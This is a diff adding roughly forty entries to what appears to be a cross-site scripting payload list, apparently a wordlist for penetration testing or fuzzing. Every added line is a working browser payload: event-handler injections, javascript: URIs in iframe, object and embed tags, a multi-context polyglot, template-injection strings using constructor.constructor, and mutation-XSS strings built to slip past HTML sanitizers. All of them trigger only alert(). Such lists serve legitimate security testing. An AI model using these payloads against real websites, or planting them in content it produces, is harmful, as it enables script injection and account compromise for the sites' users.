@@ -1344,3 +1344,44 @@ hREf="j%0aavas%09cript%0a:%09con%0afirm%0d``">z
 <iframe/src \/\/onload = prompt(1)
 <x oncut=alert()>x
 <svg onload=write()>
+<svg onload=alert(xss)>
+<body onload=alert(xss)>
+<img src=x onerror=alert(xss)>
+<body onpageshow=alert(xss)>
+<input autofocus="" onfocus=alert(xss)></input>
+<details open ontoggle="alert(xss)">
+<video autoplay onloadstart="alert(xss)" src=x></video>
+<video autoplay controls onplay="alert(xss)"><source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"></video>
+<p style="animation: x;" onanimationstart="alert()">XSS</p>
+<style>@keyframes x {}</style>
+<p style="animation: x;" onanimationend="alert()">XSS</p>
+<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.5);z-index: 5000;" onclick="alert(xss)"></div>
+<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.0);z-index: 5000;" onmouseover="alert(xss)"></div>
+<svg><animate onbegin=alert() attributeName=x></svg>
+<object data="data:text/html,<script>alert(xss)</script>">
+<iframe srcdoc="<svg onload=alert(xss);>">
+<object data=javascript:alert(xss)>
+<iframe src=javascript:alert(xss)>
+<embed src=javascript:alert(xss)>
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert(xss)//
+</noscript></noembed></template></title></textarea></style><script>alert(xss)</script>
+</title></textarea></style></noscript></noembed></template></frameset><svg onload=alert(xss)>
+</noscript></ti tle><script>alert(xss)</script
+{{_openBlock.constructor('alert(xss)')()}}
+{{constructor.constructor('alert(xss)')()}}
+{{constructor.constructor('alert(xss)')()}}
+javascript:alert(xss)%252f%252f..%252fcss-images
+[self.alert(xss)]
+[''=''or self.alert(xss)]
+[Omglol mod 1 mod self.alert (xss) andlol]
+<svg onload=alert`xss`></svg>
+<script>alert`xss`</script>
+(1,2,3,4,5,6,7,8,alert)(xss)
+<noscript><style></noscript><img src=x onerror=alert(xss)>
+<svg><style><img src=x onerror=alert(xss)></style></svg>
+<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(xss)&gt;">
+<math><mtext><table><mglyph><style><![CDATA[</style><img title="]]&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(xss)&gt;">
+<math><mtext><table><mglyph><style><!--</style><img title=&quot;--></mglyph><img	src=1	onerror=alert(xss)>">
+ <svg></p><style><a id="</style><img src=1 onerror=alert(xss)>">
+ <svg><p><style><a id="</style><img src=1 onerror=alert(xss)>"></p></svg>
+
